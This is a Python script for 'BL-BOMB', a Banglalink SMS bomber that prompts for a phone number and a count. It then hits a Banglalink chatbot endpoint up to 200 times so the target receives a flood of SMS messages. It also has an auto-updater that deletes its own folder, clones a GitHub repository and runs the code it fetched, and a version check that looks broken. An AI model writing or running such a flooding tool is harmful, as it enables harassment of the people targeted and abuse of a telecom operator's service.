import os
import time
try:
	import requests
except:
	os.system("pip install requests")
import requests


red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

color_off="\033[0m"       # Text Reset

os.system("clear")


line=(yellow+"__________________________________________________")

def header():
	os.system("lolcat logo.txt")
	print(line)
	print(green+"\n\tName    : ",cyan+"BANGLALINK SMS BOMBER")
	print(green+"\tFrom    : ",cyan+"CyberSH")
	print(green+"\tAuthor  : ",cyan+"SH TASRIF")
	print(green+"\tVersion : ",cyan+"[",red+"1.0.0",		cyan+"]")
	print(line)

def clear():
	os.system("clear")
clear()
header()

#UPDATOR
print(cyan+"\n\t\t[•]Checking For Updates...\n")

version = open(".version.txt")

mainversion = requests.get("https://raw.githubusercontent.com/ShTasrif/BL-BOMB/main/.version.txt")

mainversion = mainversion.text

time.sleep(0.6)

if(version.read() == mainversion.text):
	print(green+"      You are using the latest version of BL-BOMB")

else:
	print(red+"\n\n\t\tTool Update Found [✓]")
	clear()
	header()
	print(blue+"\n\n\t\t   Updating Tool...")

	os.system("cd .. && rm -rf BL-BOMB && git clone https://github.com/ShTasrif/BL-BOMB > /dev/null 2>&1 && python bomb.py")



#INPUT
print("\n")
number=str(input(red+"\t[➙] Enter The Number : "+green))
amount=int(input(cyan+"\n\t[➙] Enter Amount "+yellow+"[Max 200]"+cyan+" : "+green))

#NUMBER AMOUNT PRINT

clear()
header()
print(red+"      Number : "+green+number+"   |   "+red+"Amount : "+green+str(amount))
print(yellow+"--------------------------------------------------\n\n")

#MAIN

url = "https://blchatbot01.banglalink.net/blink-bot-final/number-form-t-t/result.php?secondIssue=&number="+number+"&senderId=7700118866696632&apiIssue=my_offer"

"""for i in range(amount):
	resp = requests.get(url)
	print(resp.status_code)"""
	
i = 0
for i in range (amount+1):
 a = str(i+1)
 if a == str(amount+1):
  break
 else:
  resp = requests.get(url)
  status = resp.status_code
  if status == 200:
   print(cyan+"\t["+a+"]"+green+" SMS SEND SUCCESS !")

print(yellow+"\n\n\tThanks for using BL-BOMB")
os.system("xdg-open https://youtube.com/c/CYBERSH")